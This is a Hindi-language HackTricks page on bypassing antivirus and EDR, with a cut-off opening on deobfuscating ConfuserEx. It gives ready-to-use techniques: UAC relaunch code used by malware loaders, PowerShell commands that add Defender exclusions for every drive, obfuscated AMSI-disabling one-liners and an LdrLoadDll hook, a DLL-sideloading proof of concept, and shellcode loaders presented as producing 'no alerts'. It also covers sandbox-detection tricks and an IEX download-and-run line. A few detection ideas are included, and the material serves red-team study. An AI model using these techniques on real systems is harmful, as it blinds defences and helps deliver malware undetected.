# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**यह पेज मूल रूप से** [**@m2rc_p**](https://twitter.com/m2rc_p) **द्वारा लिखा गया था!**

## Defender को रोकना

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करने से रोकने वाला एक tool।
- [no-defender](https://github.com/es3n1n/no-defender): किसी अन्य AV का दिखावा करके Windows Defender को काम करने से रोकने वाला एक tool।
- [यदि आप admin हैं तो Defender को disable करें](basic-powershell-for-pentesters/README.md)

### Defender के साथ छेड़छाड़ करने से पहले Installer-style UAC bait

Game cheats का रूप धारण करने वाले public loaders अक्सर unsigned Node.js/Nexe installers के रूप में आते हैं, जो पहले **user से elevation की अनुमति मांगते हैं** और उसके बाद ही Defender को निष्क्रिय करते हैं। इसका flow सरल है:

1. `net session` के माध्यम से administrative context की जांच करें। यह command केवल तभी सफल होती है जब caller के पास admin rights हों, इसलिए failure का अर्थ है कि loader standard user के रूप में चल रहा है।
2. Original command line को बनाए रखते हुए, अपेक्षित UAC consent prompt trigger करने के लिए स्वयं को `RunAs` verb के साथ तुरंत relaunch करें।
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
पीड़ित पहले से ही यह मानते हैं कि वे “cracked” software install कर रहे हैं, इसलिए prompt आमतौर पर स्वीकार कर लिया जाता है और malware को Defender की policy बदलने के लिए आवश्यक अधिकार मिल जाते हैं।<sup>[[26]](#references)</sup>

### हर drive letter के लिए blanket `MpPreference` exclusions

Elevated access मिलने के बाद, GachiLoader-style chains service को सीधे disable करने के बजाय Defender के blind spots को अधिकतम करती हैं। Loader पहले GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) को kill करता है और फिर **बेहद व्यापक exclusions** लागू करता है, ताकि हर user profile, system directory और removable disk को scan न किया जा सके:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
मुख्य observations:

- यह loop हर mounted filesystem (D:\, E:\, USB sticks, आदि) पर चलता है, इसलिए **disk पर कहीं भी भविष्य में drop किया गया कोई भी payload ignore कर दिया जाता है**।
- `.sys` extension exclusion future-focused है—attackers के पास बाद में unsigned drivers load करने का विकल्प सुरक्षित रहता है, और उन्हें Defender को दोबारा modify करने की आवश्यकता नहीं होती।
- सभी changes `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` के अंतर्गत लागू होते हैं, जिससे बाद के stages exclusions के persist होने की पुष्टि कर सकते हैं या UAC को दोबारा trigger किए बिना उन्हें expand कर सकते हैं।

क्योंकि कोई Defender service stop नहीं की जाती, naïve health checks “antivirus active” report करते रहते हैं, भले ही real-time inspection उन paths को कभी touch न करे।<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

वर्तमान में, AVs किसी file के malicious होने या न होने की जाँच के लिए अलग-अलग methods का उपयोग करते हैं: static detection, dynamic analysis, और अधिक advanced EDRs के लिए behavioural analysis।

### **Static detection**

Static detection किसी binary या script में ज्ञात malicious strings या bytes के arrays को flag करके, और file से information extract करके (जैसे file description, company name, digital signatures, icon, checksum आदि) की जाती है। इसका अर्थ है कि ज्ञात public tools का उपयोग करने पर आपके पकड़े जाने की संभावना अधिक हो सकती है, क्योंकि उनका संभवतः analysis किया जा चुका है और उन्हें malicious के रूप में flag किया गया है। इस प्रकार की detection से बचने के कुछ तरीके हैं:

- **Encryption**

यदि आप binary को encrypt करते हैं, तो AV के पास आपके program को detect करने का कोई तरीका नहीं होगा, लेकिन आपको किसी प्रकार के loader की आवश्यकता होगी, जो program को decrypt करके memory में run कर सके।

- **Obfuscation**

कभी-कभी AV से बचाने के लिए अपने binary या script में कुछ strings बदलना ही पर्याप्त होता है, लेकिन आप क्या obfuscate करने का प्रयास कर रहे हैं, उसके आधार पर यह समय लेने वाला काम हो सकता है।

- **Custom tooling**

यदि आप अपने tools स्वयं develop करते हैं, तो कोई ज्ञात bad signatures नहीं होंगी, लेकिन इसमें काफी समय और effort लगता है।

> [!TIP]
> Windows Defender की static detection के विरुद्ध जाँच करने का एक अच्छा तरीका [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) है। यह मूल रूप से file को कई segments में split करता है और फिर Defender को प्रत्येक segment को अलग-अलग scan करने का task देता है। इस तरह यह आपको ठीक-ठीक बता सकता है कि आपके binary में कौन-सी strings या bytes flag की गई हैं।

मैं आपको practical AV Evasion के बारे में इस [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) को देखने की अत्यधिक सलाह देता हूँ।

### **Dynamic analysis**

Dynamic analysis तब होता है जब AV आपके binary को sandbox में run करता है और malicious activity पर नज़र रखता है (जैसे आपके browser के passwords को decrypt और read करने का प्रयास करना, LSASS पर minidump करना आदि)। इस हिस्से के साथ काम करना थोड़ा अधिक मुश्किल हो सकता है, लेकिन sandboxes से बचने के लिए आप कुछ चीज़ें कर सकते हैं।

- **Execution से पहले Sleep** इसके implementation के आधार पर, यह AV के dynamic analysis को bypass करने का एक अच्छा तरीका हो सकता है। AVs के पास files को scan करने के लिए बहुत कम समय होता है, ताकि user का workflow बाधित न हो। इसलिए long sleeps का उपयोग binaries के analysis में बाधा डाल सकता है। समस्या यह है कि कई AVs के sandboxes implementation के आधार पर sleep को skip कर सकते हैं।
- **Machine के resources की जाँच** आमतौर पर Sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (जैसे < 2GB RAM), अन्यथा वे user की machine को slow कर सकते हैं। यहाँ आप काफी creative भी हो सकते हैं, उदाहरण के लिए CPU का temperature या fan speeds तक check करके; sandbox में हर चीज़ implemented नहीं होगी।
- **Machine-specific checks** यदि आप ऐसे user को target करना चाहते हैं जिसका workstation `"contoso.local"` domain से joined है, तो आप computer के domain को check करके देख सकते हैं कि वह आपके specified domain से match करता है या नहीं। यदि match न करे, तो आप अपने program को exit करा सकते हैं।

पता चला है कि Microsoft Defender's Sandbox computername `HAL9TH` है। इसलिए detonation से पहले आप अपने malware में computer name check कर सकते हैं। यदि name `HAL9TH` से match करता है, तो इसका अर्थ है कि आप Defender's sandbox के अंदर हैं, इसलिए आप अपने program को exit करा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के विरुद्ध जाने के लिए [@mgeeky](https://twitter.com/mariuszbit) की ओर से कुछ अन्य बहुत अच्छे tips

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने इस post में पहले कहा है, **public tools** अंततः **detect हो जाएंगे**, इसलिए आपको स्वयं से एक प्रश्न पूछना चाहिए:

उदाहरण के लिए, यदि आप LSASS dump करना चाहते हैं, तो **क्या आपको वास्तव में mimikatz का उपयोग करने की आवश्यकता है**? या क्या आप किसी ऐसे अलग project का उपयोग कर सकते हैं जो कम प्रसिद्ध हो और LSASS को dump भी करता हो?

सही उत्तर संभवतः दूसरा विकल्प है। mimikatz को उदाहरण के रूप में लें: यह संभवतः AVs और EDRs द्वारा सबसे अधिक flag किए गए malware में से एक है। हालांकि project स्वयं बहुत अच्छा है, लेकिन AVs से बचाने के लिए इसके साथ काम करना एक nightmare भी है। इसलिए, आप जो हासिल करना चाहते हैं उसके लिए alternatives खोजें।

> [!TIP]
> Evasion के लिए अपने payloads को modify करते समय, defender में **automatic sample submission को turn off** करना सुनिश्चित करें। और कृपया, यदि आपका लक्ष्य लंबे समय तक evasion प्राप्त करना है, तो **VIRUSTOTAL पर UPLOAD न करें**। यदि आप check करना चाहते हैं कि आपका payload किसी particular AV द्वारा detect होता है या नहीं, तो उसे VM पर install करें, automatic sample submission को turn off करने का प्रयास करें, और result से संतुष्ट होने तक वहीं test करें।

## EXEs vs DLLs

जब भी संभव हो, evasion के लिए हमेशा **DLLs के उपयोग को prioritize करें**। मेरे अनुभव में, DLL files आमतौर पर **काफी कम detect और analyze की जाती हैं**, इसलिए कुछ मामलों में detection से बचने के लिए यह एक बहुत simple trick है (यदि आपके payload में DLL के रूप में run होने का कोई तरीका है, तो)।

जैसा कि हम इस image में देख सकते हैं, Havoc के DLL Payload की antiscan.me में detection rate 4/26 है, जबकि EXE payload की detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

अब हम कुछ ऐसी tricks दिखाएंगे जिनका उपयोग करके आप DLL files को काफी अधिक stealthy बना सकते हैं।

## DLL Sideloading & Proxying

**DLL Sideloading** loader द्वारा उपयोग किए जाने वाले DLL search order का लाभ उठाता है, जिसमें victim application और malicious payload(s) दोनों को एक-दूसरे के साथ रखा जाता है।

आप [Siofra](https://github.com/Cybereason/siofra) और निम्नलिखित powershell script का उपयोग करके DLL Sideloading के प्रति susceptible programs की जाँच कर सकते हैं:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
यह command `"C:\Program Files\\"` के अंदर DLL hijacking के लिए susceptible programs और वे जिन DLL files को load करने का प्रयास करते हैं, उनकी list output करेगा।

मैं अत्यधिक recommend करता हूं कि आप **DLL Hijackable/Sideloadable programs को स्वयं explore करें**। सही तरीके से की गई यह technique काफी stealthy होती है, लेकिन यदि आप publicly known DLL Sideloadable programs का उपयोग करते हैं, तो आप आसानी से पकड़े जा सकते हैं।

किसी program द्वारा load किए जाने की अपेक्षा की जाने वाली name वाली malicious DLL रखने मात्र से आपका payload load नहीं होगा, क्योंकि program उस DLL के अंदर कुछ specific functions की अपेक्षा करता है। इस समस्या को ठीक करने के लिए, हम **DLL Proxying/Forwarding** नामक एक अन्य technique का उपयोग करेंगे।

**DLL Proxying** किसी program द्वारा किए गए calls को proxy (और malicious) DLL से original DLL की ओर forward करता है, जिससे program की functionality बनी रहती है और आपके payload के execution को handle करना संभव होता है।

मैं [@flangvik](https://twitter.com/Flangvik) के [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project का उपयोग करूंगा।

ये वे steps हैं जिन्हें मैंने follow किया:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
अंतिम command हमें 2 files देगा: एक DLL source code template और मूल नाम बदली हुई DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These हैं परिणाम:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे shellcode ([SGN](https://github.com/EgeBalci/sgn) से encoded) और proxy DLL, दोनों की [antiscan.me](https://antiscan.me) में 0/26 Detection rate है! मैं इसे सफल परिणाम कहूंगा।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> मैं **दृढ़ता से अनुशंसा करता हूं** कि आप DLL Sideloading के बारे में [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) और [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) देखें, ताकि हमने जिस विषय पर चर्चा की है उसे अधिक गहराई से समझ सकें।

### Forwarded Exports का दुरुपयोग (ForwardSideLoading)

Windows PE modules ऐसे functions export कर सकते हैं जो वास्तव में "forwarders" होते हैं: code की ओर point करने के बजाय, export entry में `TargetDll.TargetFunc` के रूप में एक ASCII string होती है। जब कोई caller export को resolve करता है, तो Windows loader:

- यदि `TargetDll` पहले से loaded नहीं है, तो उसे load करता है
- उसमें से `TargetFunc` को resolve करता है

समझने योग्य मुख्य व्यवहार:
- यदि `TargetDll` एक KnownDLL है, तो उसे protected KnownDLLs namespace (जैसे ntdll, kernelbase, ole32) से उपलब्ध कराया जाता है।<sup>[[15]](#references)</sup>
- यदि `TargetDll` एक KnownDLL नहीं है, तो सामान्य DLL search order का उपयोग किया जाता है, जिसमें उस module की directory भी शामिल होती है जो forward resolution कर रहा है।

यह एक indirect sideloading primitive को सक्षम करता है: ऐसी signed DLL खोजें जो किसी non-KnownDLL module name को forwarded function export करे, फिर उस signed DLL को attacker-controlled DLL के साथ रखें जिसका नाम forwarded target module के नाम से बिल्कुल मेल खाता हो। जब forwarded export को invoke किया जाता है, तो loader forward को resolve करता है और आपकी DLL को उसी directory से load करता है, जिससे आपका DllMain execute होता है।<sup>[[13]](#references)</sup>

Windows 11 पर देखा गया उदाहरण:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` एक KnownDLL नहीं है, इसलिए इसे सामान्य search order के माध्यम से resolve किया जाता है।

PoC (copy-paste):
1) signed system DLL को writable folder में कॉपी करें
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी folder में एक malicious `NCRYPTPROV.dll` डालें। Code execution प्राप्त करने के लिए एक minimal DllMain पर्याप्त है; DllMain को trigger करने के लिए forwarded function को implement करना आवश्यक नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) एक signed LOLBin के साथ forward को trigger करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) को load करता है
- `KeyIsoSetAuditingInterface` को resolve करते समय, loader forward को `NCRYPTPROV.SetAuditingInterface` तक follow करता है
- इसके बाद loader `C:\test` से `NCRYPTPROV.dll` को load करता है और उसका `DllMain` execute करता है
- यदि `SetAuditingInterface` implement नहीं किया गया है, तो `DllMain` पहले ही run हो जाने के बाद "missing API" error मिलता है

Hunting tips:
- उन forwarded exports पर focus करें जिनका target module KnownDLL नहीं है। KnownDLLs को `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` के अंतर्गत सूचीबद्ध किया जाता है।
- आप forwarded exports को ऐसे tooling से enumerate कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Candidates खोजने के लिए Windows 11 forwarder inventory देखें: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Detection/defense ideas:
- LOLBins (जैसे, rundll32.exe) द्वारा non-system paths से signed DLLs लोड करने की निगरानी करें, जिसके बाद उसी directory से समान base name वाले non-KnownDLLs लोड किए जाते हैं
- इस प्रकार की process/module chains पर alert करें: `rundll32.exe` → non-system `keyiso.dll` → user-writable paths के अंतर्गत `NCRYPTPROV.dll`
- Code integrity policies (WDAC/AppLocker) लागू करें और application directories में write+execute को deny करें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze suspended processes, direct syscalls और alternative execution methods का उपयोग करके EDRs को bypass करने वाला payload toolkit है`

आप Freeze का उपयोग अपने shellcode को stealthy तरीके से load और execute करने के लिए कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion केवल cat & mouse game है; जो आज काम करता है, वह कल detect हो सकता है। इसलिए कभी भी केवल एक tool पर निर्भर न रहें; यदि संभव हो, तो कई evasion techniques को chain करने का प्रयास करें।

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs अक्सर `ntdll.dll` के syscall stubs पर **user-mode inline hooks** लगाते हैं। इन hooks को bypass करने के लिए, आप ऐसे **direct** या **indirect** syscall stubs generate कर सकते हैं जो सही **SSN** (System Service Number) load करते हैं और hooked export entrypoint को execute किए बिना kernel mode में transition करते हैं।<sup>[[32]](#references)</sup>

**Invocation options:**
- **Direct (embedded)**: generated stub में `syscall`/`sysenter`/`SVC #0` instruction emit करता है (`ntdll` export hit नहीं होता)।
- **Indirect**: मौजूदा `syscall` gadget के अंदर jump करता है जो `ntdll` में मौजूद होता है, जिससे kernel transition `ntdll` से originate होता हुआ दिखाई देता है (heuristic evasion के लिए उपयोगी); **randomized indirect** प्रत्येक call के लिए एक pool से gadget चुनता है।
- **Egg-hunt**: disk पर static `0F 05` opcode sequence embed करने से बचता है; runtime पर syscall sequence resolve करता है।

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes पढ़ने के बजाय syscall stubs को virtual address के आधार पर sort करके SSNs infer करता है।
- **SyscallsFromDisk**: clean `\KnownDlls\ntdll.dll` को map करता है, उसके `.text` से SSNs पढ़ता है, फिर unmap करता है (सभी in-memory hooks को bypass करता है)।
- **RecycledGate**: VA-sorted SSN inference को opcode validation के साथ combine करता है जब stub clean हो; hooked होने पर VA inference पर fallback करता है।
- **HW Breakpoint**: `syscall` instruction पर DR0 set करता है और runtime पर `EAX` से SSN capture करने के लिए VEH का उपयोग करता है, hooked bytes को parse किए बिना।

SysWhispers4 usage का उदाहरण:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI को "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" को रोकने के लिए बनाया गया था। शुरुआत में, AVs केवल **disk पर मौजूद files** को scan करने में सक्षम थे, इसलिए यदि आप किसी तरह payloads को **सीधे memory में** execute कर सकते थे, तो AV इसे रोकने के लिए कुछ नहीं कर सकता था, क्योंकि उसके पास पर्याप्त visibility नहीं थी।

AMSI feature Windows के इन components में integrated है।

- User Account Control, या UAC (EXE, COM, MSI, या ActiveX installation का elevation)
- PowerShell (scripts, interactive use, और dynamic code evaluation)
- Windows Script Host (wscript.exe और cscript.exe)
- JavaScript और VBScript
- Office VBA macros

यह antivirus solutions को script contents को ऐसे form में expose करके script behavior inspect करने की अनुमति देता है, जो unencrypted और unobfuscated दोनों हो।

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` चलाने पर Windows Defender में निम्न alert दिखाई देगा।

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` और उसके बाद उस executable का path जोड़ता है, जिससे script चला था; इस मामले में, powershell.exe

हमने disk पर कोई file drop नहीं की, फिर भी AMSI के कारण in-memory पकड़े गए।

इसके अलावा, **.NET 4.8** से शुरू होकर, C# code को भी AMSI के माध्यम से run किया जाता है। इसका असर `Assembly.Load(byte[])` पर भी पड़ता है, जिसका उपयोग in-memory execution load करने के लिए किया जाता है। इसलिए, यदि आप AMSI को evade करते हुए in-memory execution करना चाहते हैं, तो .NET के lower versions (जैसे 4.7.2 या उससे नीचे) का उपयोग recommended है।

AMSI से बचने के कुछ तरीके हैं:

- **Obfuscation**

क्योंकि AMSI मुख्य रूप से static detections के साथ काम करता है, इसलिए जिन scripts को आप load करने की कोशिश कर रहे हैं, उन्हें modify करना detection evade करने का एक अच्छा तरीका हो सकता है।

हालांकि, AMSI scripts को unobfuscate करने में सक्षम है, भले ही उनमें multiple layers हों, इसलिए इसे किस तरह किया गया है, इस पर निर्भर करते हुए obfuscation एक खराब option हो सकता है। इससे evade करना इतना straightforward नहीं रहता। हालांकि, कभी-कभी आपको केवल कुछ variable names बदलने की आवश्यकता होती है और काम हो जाता है, इसलिए यह इस बात पर निर्भर करता है कि किसी चीज़ को किस हद तक flagged किया गया है।

- **AMSI Bypass**

चूंकि AMSI को powershell (साथ ही cscript.exe, wscript.exe आदि) process में एक DLL load करके implement किया जाता है, इसलिए unprivileged user के रूप में run करते हुए भी इसके साथ आसानी से tamper करना संभव है। AMSI के implementation में मौजूद इस flaw के कारण, researchers ने AMSI scanning को evade करने के कई तरीके खोजे हैं।

**Forcing an Error**

AMSI initialization को fail करने के लिए force करने (`amsiInitFailed`) से current process के लिए कोई scan initiate नहीं होगा। इसे मूल रूप से [Matt Graeber](https://twitter.com/mattifestation) ने disclose किया था और Microsoft ने इसके व्यापक उपयोग को रोकने के लिए एक signature develop किया है।
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
एक powershell code की केवल एक line ही वर्तमान powershell process के लिए AMSI को unusable बनाने के लिए पर्याप्त थी। बेशक, इस line को स्वयं AMSI ने flag कर दिया है, इसलिए इस technique का उपयोग करने के लिए कुछ modification आवश्यक है।

यह एक modified AMSI bypass है, जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
ध्यान रखें कि यह post प्रकाशित होने के बाद संभवतः flag हो जाएगा, इसलिए यदि आपकी योजना undetected रहने की है, तो कोई code publish नहीं करना चाहिए।

**Memory Patching**

इस technique की खोज सबसे पहले [@RastaMouse](https://twitter.com/_RastaMouse/) ने की थी। इसमें amsi.dll में "AmsiScanBuffer" function का address ढूंढना शामिल है, जो user-supplied input को scan करने के लिए जिम्मेदार है, और उसे E_INVALIDARG का code return करने वाले instructions से overwrite किया जाता है। इस तरह, actual scan का result 0 return होता है, जिसे clean result के रूप में interpret किया जाता है।

> [!TIP]
> अधिक विस्तृत explanation के लिए कृपया [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

powershell के साथ AMSI bypass करने के लिए कई अन्य techniques भी उपयोग की जाती हैं। इनके बारे में अधिक जानने के लिए [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) देखें।

### amsi.dll load को रोककर AMSI को block करना (LdrLoadDll hook)

AMSI को केवल तब initialise किया जाता है जब `amsi.dll` current process में load हो जाती है। एक robust, language-agnostic bypass है कि `ntdll!LdrLoadDll` पर user-mode hook लगाया जाए, जो requested module `amsi.dll` होने पर error return करे। इसके परिणामस्वरूप, AMSI कभी load नहीं होता और उस process के लिए कोई scan नहीं होता।<sup>[[23]](#references)</sup>

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
नोट्स
- PowerShell, WScript/CScript और custom loaders सभी में काम करता है (ऐसी किसी भी चीज़ में जो अन्यथा AMSI लोड करती)।
- Scripts को stdin के माध्यम से भेजने (`PowerShell.exe -NoProfile -NonInteractive -Command -`) के साथ उपयोग करें, ताकि लंबे command-line artefacts से बचा जा सके।
- LOLBins के माध्यम से execute किए गए loaders में इसका उपयोग देखा गया है (जैसे, `regsvr32` द्वारा `DllRegisterServer` को call करना)।

Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** भी AMSI को bypass करने के लिए script generate करता है।
Tool **[https://amsibypass.com/](https://amsibypass.com/)** भी AMSI को bypass करने के लिए ऐसा script generate करता है जो randomized user-defined function, variables, characters expression का उपयोग करके और PowerShell keywords में random character casing लागू करके signature से बचता है।

**Detected signature को हटाएँ**

आप **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** जैसे tool का उपयोग करके current process की memory से detected AMSI signature को हटा सकते हैं। यह tool current process की memory को AMSI signature के लिए scan करके और फिर उसे NOP instructions से overwrite करके काम करता है, जिससे वह memory से प्रभावी रूप से हट जाता है।

**AMSI का उपयोग करने वाले AV/EDR products**

AMSI का उपयोग करने वाले AV/EDR products की list आप **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** में पा सकते हैं।

**PowerShell version 2 का उपयोग करें**
यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI load नहीं होगा, इसलिए आप अपने scripts को AMSI द्वारा scan किए बिना चला सकते हैं। आप यह कर सकते हैं:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging एक ऐसी सुविधा है जो system पर execute किए गए सभी PowerShell commands को log करने की अनुमति देती है। यह auditing और troubleshooting के लिए उपयोगी हो सकती है, लेकिन यह **detection से बचना चाहने वाले attackers के लिए एक समस्या** भी हो सकती है।

PowerShell logging को bypass करने के लिए आप निम्नलिखित techniques का उपयोग कर सकते हैं:

- **Disable PowerShell Transcription and Module Logging**: इस उद्देश्य के लिए आप [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) जैसे tool का उपयोग कर सकते हैं।
- **Use Powershell version 2**: यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI load नहीं होगा, इसलिए आप अपने scripts को AMSI द्वारा scan किए बिना चला सकते हैं। आप यह कर सकते हैं: `powershell.exe -version 2`
- **Use an unmanaged PowerShell session**: `powershell.exe` launch किए बिना PowerShell को host करने के लिए [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) का उपयोग करें (यह Cobalt Strike के `powerpick` द्वारा उपयोग किया जाने वाला approach है)। इससे विशेष रूप से `powershell.exe` process से जुड़े controls evade होते हैं, लेकिन यह स्वाभाविक रूप से AMSI, Script Block Logging या अन्य प्रत्येक PowerShell defense को disable नहीं करता; coverage runtime और host implementation पर निर्भर करती है।


## Obfuscation

> [!TIP]
> कई obfuscation techniques data को encrypt करने पर निर्भर करती हैं, जिससे binary की entropy बढ़ जाएगी और AVs तथा EDRs के लिए उसे detect करना आसान हो जाएगा। इसके साथ सावधान रहें और संभव हो तो encryption को अपने code के केवल उन specific sections पर लागू करें जो sensitive हैं या जिन्हें hidden रखना आवश्यक है।

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2 (या commercial forks) का उपयोग करने वाले malware का analysis करते समय protection की कई layers का सामना करना सामान्य है, जो decompilers और sandboxes को block कर देती हैं। नीचे दिया गया workflow विश्वसनीय रूप से **near-original IL restore करता है**, जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – ConfuserEx हर *method body* को encrypt करता है और उसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch करता है, इसलिए कोई भी modification binary को crash कर देगा। Encrypted metadata tables को locate करने, XOR keys recover करने और clean assembly rewrite करने के लिए **AntiTamperKiller** का उपयोग करें:
